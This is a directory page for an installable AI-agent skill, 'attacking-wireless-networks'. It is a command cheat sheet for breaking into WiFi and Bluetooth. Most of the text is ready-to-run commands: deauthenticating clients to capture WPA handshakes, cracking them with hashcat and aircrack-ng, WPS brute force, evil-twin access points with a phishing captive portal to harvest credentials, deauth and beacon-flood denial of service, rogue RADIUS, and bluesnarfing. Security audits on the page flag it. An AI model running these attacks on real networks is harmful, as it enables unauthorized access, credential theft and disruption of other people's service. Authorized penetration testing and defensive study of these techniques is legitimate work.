---
rating: ⭐⭐⭐
title: attacking-wireless-networks
url: https://skills.sh/trilwu/secskills/attacking-wireless-networks
---

# attacking-wireless-networks

skills/trilwu/secskills/attacking-wireless-networks
attacking-wireless-networks
Installation
$ npx skills add https://github.com/trilwu/secskills --skill attacking-wireless-networks
SKILL.md
Attacking Wireless Networks
When to Use
WiFi penetration testing
Wireless network security assessment
WPA/WPA2/WPA3 cracking
Evil Twin and rogue AP attacks
Wireless reconnaissance
Setup and Tools

Enable Monitor Mode:

# Check wireless interface
iwconfig
iw dev

# Enable monitor mode
airmon-ng start wlan0
# Creates wlan0mon

# Or manually
ip link set wlan0 down
iw wlan0 set monitor none
ip link set wlan0 up

# Disable interfering processes
airmon-ng check kill


Essential Tools:

aircrack-ng suite
Wireshark
Kismet
Reaver/Bully (WPS)
Wifite (automated)
hcxtools/hcxdumptool
Fluxion (Evil Twin)
WiFi Reconnaissance

Network Discovery:

# Scan for networks
airodump-ng wlan0mon

# Scan specific channel
airodump-ng -c 6 wlan0mon

# Scan and save to file
airodump-ng -w capture wlan0mon

# Filter by BSSID
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon


Kismet:

# Start Kismet
kismet

# Command line
kismet_server
kismet_client

# View in web UI
http://localhost:2501

WPA/WPA2 Attacks
Capture Handshake
# Method 1: Wait for client connection
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Method 2: Deauth clients to force reconnect
# In another terminal
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Or target specific client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon

# Verify handshake captured
aircrack-ng capture-01.cap
# Look for "1 handshake"

Crack Handshake

Aircrack-ng:

# Crack with wordlist
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# With specific ESSID
aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap


Hashcat:

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack WPA/WPA2 (mode 22000)
hashcat -m 22000 hash.hc22000 wordlist.txt

# With rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d


John the Ripper:

# Convert cap to john format
hccap2john capture-01.cap > hash.john

# Crack
john --wordlist=wordlist.txt hash.john

WPS Attacks
WPS Brute Force (Reaver)
# Check WPS status
wash -i wlan0mon

# Reaver attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay (less aggressive)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5

# Pixie Dust attack (if vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K

Bully (Alternative)
# Standard attack
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie Dust
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -d

Evil Twin Attacks
Fluxion
# Start Fluxion
./fluxion.sh

# Follow prompts to:
# 1. Select target network
# 2. Capture handshake
# 3. Create fake AP
# 4. Launch captive portal
# 5. Capture credentials

Manual Evil Twin
# Create rogue AP
hostapd rogue_ap.conf

# Sample hostapd.conf:
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g

# DHCP server
dnsmasq -C dnsmasq.conf

# Sample dnsmasq.conf:
interface=wlan0mon
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8

# Captive portal (fake login page)
# Setup web server with phishing page

WPA3 Attacks
Dragonblood
# Dragonblood toolkit
# Tests WPA3 vulnerabilities (CVE-2019-13377, CVE-2019-13456)

# Dictionary attack (downgrade to WPA2)
# If SAE (WPA3) and WPA2 transition mode enabled

Brute Force SAE
# hashcat WPA3 (experimental)
hashcat -m 22000 hash.hc22000 wordlist.txt

Denial of Service
Deauthentication Attack
# Deauth all clients
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon

# MDK3 (more aggressive)
mdk3 wlan0mon d -c 6

Beacon Flooding
# MDK3 beacon flood
mdk3 wlan0mon b -f fake_aps.txt

# Create many fake APs
mdk3 wlan0mon b -n "FakeAP" -m -s 1000

Automated Tools
Wifite
# Automated WiFi cracking
wifite

# Target WPA only
wifite --wpa

# Target WPS only
wifite --wps

# Specific BSSID
wifite -b AA:BB:CC:DD:EE:FF

# With custom wordlist
wifite --dict wordlist.txt

WiFi-Pumpkin (Rogue AP Framework)
# Launch WiFi-Pumpkin
wifi-pumpkin

# Features:
# - Rogue AP creation
# - MITM attacks
# - DNS spoofing
# - Captive portal
# - Traffic sniffing

Enterprise WiFi (WPA-Enterprise)
EAP-TLS/PEAP Attacks
# Capture EAP handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap_capture wlan0mon

# Extract RADIUS traffic
tshark -r eap_capture-01.cap -Y "eap"

# Rogue RADIUS server
# hostapd-wpe (Wireless Pwnage Edition)
hostapd-wpe wpe.conf

# Crack captured hashes
asleap -r capture.dump -w wordlist.txt

Packet Injection Testing
# Test injection capability
aireplay-ng --test wlan0mon

# Fake authentication
aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon

# ARP replay attack
aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon

Hidden SSID Discovery
# Passive monitoring
airodump-ng wlan0mon
# Wait for client probe requests

# Active probing
mdk3 wlan0mon p -t AA:BB:CC:DD:EE:FF

# Deauth and capture beacon
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

Bluetooth Attacks
Discovery
# Scan for devices
hcitool scan

# Detailed info
hcitool info AA:BB:CC:DD:EE:FF

# Service discovery
sdptool browse AA:BB:CC:DD:EE:FF

BluetoothHunting
# Bluesnarfing (file access)
bluesnarfer -b AA:BB:CC:DD:EE:FF

# Bluejacking (send messages)
echo "Message" | bluejack AA:BB:CC:DD:EE:FF

# PIN brute force
crackle -i hci0 -o pin.txt

Quick WiFi Pentest Workflow
Monitor Mode - Enable monitor mode on wireless adapter
Reconnaissance - Scan for networks (airodump-ng/kismet)
Target Selection - Choose network (WPS-enabled for easy win)
Handshake Capture - Deauth clients and capture 4-way handshake
Cracking - Crack with hashcat/aircrack-ng
Post-Exploitation - Connect and perform MITM/sniffing
Common Wins
WPS-enabled routers - Often crackable in minutes with Reaver
Weak passwords - Common WiFi passwords in rockyou.txt
WPA2 Transition Mode - Allows downgrade attacks
Open guest networks - No authentication required
Misconfigured Enterprise - Weak RADIUS authentication
Defense Detection
Wireless IDS (WIDS) may detect:
Deauthentication attacks
Rogue access points
Evil Twin attacks
WPS brute force attempts
Be aware of monitoring and physical security
References
https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
https://www.aircrack-ng.org/
https://github.com/wifiphisher/wifiphisher
https://www.kali.org/tools/
Weekly Installs
13
Repository
trilwu/secskills
GitHub Stars
33
First Seen
Jan 29, 2026
Security Audits
Gen Agent Trust HubWarn
SocketWarn
SnykFail